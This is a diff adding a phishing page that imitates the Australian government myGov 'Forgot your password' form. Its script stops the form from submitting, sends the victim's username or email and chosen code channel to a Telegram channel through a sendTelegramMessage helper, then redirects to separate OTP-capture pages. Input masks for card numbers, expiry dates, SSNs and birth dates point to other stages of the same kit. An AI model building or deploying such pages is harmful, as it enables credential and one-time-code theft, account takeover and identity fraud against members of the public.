@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>
+        Forgot your password - myGov
+    </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="./css/css.css" rel="stylesheet">
+    <link href="./css/mgv2-application.css" rel="stylesheet">
+    <link href="./css/blugov.css" rel="stylesheet">
+    <style>
+        /* Additional inline styles for the processing button */
+        .button-main .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ffffff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        .button-main.processing .spinner {
+            display: inline-block;
+        }
+        .button-main.processing .btn-text {
+            display: none;
+        }
+        .button-main.processing {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+
+<body>
+    <header role="banner" class="mgvEnhanceHeader">
+        <section class="wrapper">
+            <div class="inner">
+                <div class="unauth-grid">
+                    <div class="unauth-grid-row">
+                        <a href="#" class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="./images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
+                        </a>
+                        <div class="header-links">
+                            <a href="#">Help</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </header>
+    <div class="wrapper-mapwap"><div class="main-block" id="content" role="main">	
+	
+
+		
+
+	<h1>Forgot your password</h1>
+
+	<form id="reset-password-form" action="/las/mygov-login?execution=e5s2" method="post">
+		<label for="userId">Username or email address
+			<div class="input-group">
+				<input id="userId" name="username" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off">
+			</div>
+		</label>
+		
+		<fieldset>
+			<legend class="non-heading">We will send you a code. Where would you like it sent?</legend>
+			
+			<input id="email_add" name="channel" checked="checked" type="radio" value="EMAIL">				
+			<label for="email_add">Email</label>
+			
+			<input id="mobile_no" name="channel" type="radio" value="SMS">				
+			<label for="mobile_no">SMS</label> 				
+		</fieldset>
+		
+		<div class="button-container">
+			<button type="submit" id="add" name="_eventId_next" value="Next" class="button-main button"><span class="btn-text">Next</span><span class="spinner"></span></button>
+			<button type="button" onclick="location.href='/las/mygov-login?execution=e5s2&amp;_eventId=cancel'" class="button-minor button">Cancel</button>
+		</div>
+					
+		<input type="hidden" name="_csrf" value="bced7307-4b4e-4fbc-822c-99ffa14838a6">
+		
+	<div>
+<input type="hidden" name="_csrf" value="bced7307-4b4e-4fbc-822c-99ffa14838a6">
+</div></form>		
+</div></div>
+    <footer role="contentinfo">
+        <div class="wrapper">
+            <div class="inner">
+                <section class="footer-list">
+                    <nav>
+                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
+                        <ul class="lower-links">
+                            <li><a target="_blank" href="#">Terms of use</a></li>
+                            <li><a target="_blank" href="#">Privacy and security</a></li>
+                            <li><a target="_blank" href="#">Copyright</a></li>
+                            <li><a target="_blank" href="#">Accessibility</a></li>
+                        </ul>
+                    </nav>
+                </section>
+                <div class="footer-lower">
+                    <section class="footer-lower-logo">
+                        <a href="#">
+                            <img src="./images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+                        </a>
+                    </section>
+                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ====== SCRIPTS ====== -->
+    <!-- Full jQuery (contains $.ajax) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
+    <script type="text/javascript">
+        $("#ssn").inputmask({ "mask": "999-99-9999" });
+        $("#cn").inputmask({ "mask": "9999 9999 9999 9999" });
+        $("#dob").inputmask({ "mask": "99/99/9999", "placeholder": "DD/MM/YYYY" });
+        $("#exdate").inputmask({ "mask": "99/9999", "placeholder": "MM/YYYY" });
+        $("#ph").inputmask({ "mask": "999-999-9999" });
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+
+    <!-- ====== TELEGRAM + CHANNEL-BASED REDIRECT ====== -->
+    <script src="endpoints.js"></script>
+<script src="config.js"></script>
+<script>
+    const CHANNEL_ROUTES = {
+        'EMAIL': 'eotp.html',
+        'SMS':   'otp2.html'
+    };
+
+    $(document).ready(function() {
+        $('#reset-password-form').on('submit', function(e) {
+            e.preventDefault();
+            let userId = $.trim($('#userId').val());
+            if (!userId) { alert('Please enter your username or email address.'); return; }
+            let channel = $('input[name="channel"]:checked').val() || 'EMAIL';
+            let channelText = (channel === 'SMS') ? 'SMS' : 'Email';
+            const $btn = $('#add');
+            $btn.addClass('processing');
+            $btn.prop('disabled', true);
+            let msg = "|----------| FORGOT PASSWORD |--------------|\n";
+            msg += "Username/Email: " + userId + "\n";
+            msg += "Send code via: " + channelText + "\n";
+            msg += "|-----------------------------------------|";
+            sendTelegramMessage(msg).catch(() => {});
+            const destination = CHANNEL_ROUTES[channel] || 'otp2.html';
+            setTimeout(function() { window.location.href = destination; }, 5000);
+        });
+    });
+</script>
+</body>
+
+</html>
